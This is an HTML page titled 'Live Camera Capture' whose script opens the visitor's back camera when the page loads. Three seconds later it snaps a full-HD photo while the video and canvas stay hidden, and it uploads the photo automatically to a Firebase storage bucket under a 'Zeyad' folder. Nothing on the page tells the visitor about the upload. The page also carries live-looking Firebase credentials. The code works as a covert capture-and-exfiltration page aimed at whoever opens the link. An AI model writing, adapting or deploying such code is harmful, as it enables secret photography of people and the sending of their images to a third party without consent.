<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Camera Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            color: #fff; /* White text */
            text-align: center;
        }

        h1 {
            display: none; /* Hide the title */
        }

        video {
            display: none; /* Hide video element */
        }

        canvas {
            display: none; /* Hide canvas element */
        }

        img {
            width: 100%; /* Show image at full width */
            max-width: 600px; /* Limit maximum width */
            height: auto; /* Maintain aspect ratio */
            border: 2px solid #fff; /* Optional styling */
            margin-top: 20px; /* Space above image */
        }
    </style>
    <script type="module">
        // Import the necessary Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        function uploadImage(imageData) {
            // Upload to the "Zeyad" folder
            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Generate unique filename
            uploadString(storageRef, imageData, 'data_url')
                .then((snapshot) => {
                    console.log('Uploaded a blob or file!');
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        // Access the video and canvas elements
        window.addEventListener('load', () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            const capturedImage = document.getElementById('capturedImage'); // Image element to display captured picture

            // Function to start capturing from the back camera
            function startCapture() {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { exact: "environment" }, // Use back camera
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(stream => {
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                        canvas.height = 1080; // Set canvas height to 1080 for 1080p

                        // Automatically capture the image after a short delay
                        setTimeout(() => {
                            captureImage();
                            stopVideo(stream); // Stop the video stream after capturing
                        }, 3000); // 3 seconds
                    };
                })
                .catch(err => {
                    console.error('Error accessing camera: ', err);
                });
            }

            // Function to capture image
            function captureImage() {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');
                // Display the captured image
                capturedImage.src = imageData;
                // Automatically upload the image to the server
                uploadImage(imageData);
            }

            // Function to stop the video stream
            function stopVideo(stream) {
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
            }

            // Start capturing from the back camera
            startCapture();
        });
    </script>
</head>
<body>
    <div class="container">
        <video id="video" autoplay></video>
        <canvas id="canvas"></canvas>
        <img id="capturedImage" alt="Captured Image" /> <!-- Image element to display captured picture -->
    </div>
</body>
</html>
